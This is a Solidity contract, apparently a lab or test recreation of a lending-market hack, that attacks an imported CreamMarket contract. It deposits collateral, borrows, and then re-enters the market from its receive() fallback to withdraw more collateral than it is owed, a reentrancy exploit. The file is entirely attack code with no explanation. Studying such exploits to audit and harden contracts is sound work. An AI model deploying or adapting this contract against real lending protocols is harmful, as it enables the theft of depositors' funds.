// SPDX-Licence-Identifier: MIT
pragma solidity ^0.8.28;

import "./CreamMarket.sol";

contract CreamAttack {
    CreamMarket public market;
    bool public attacked;

    constructor(address _marketAddress) {
        market = CreamMarket(_marketAddress);
    }

    function attack() public payable {
        market.depositCollateral{value: msg.value}();
        market.borrow(5 ether);
    }

    receive() external payable {
        if (!attacked) {
            attacked = true;
            market.withdrawCollateral(10 ether);
        }
    }
}
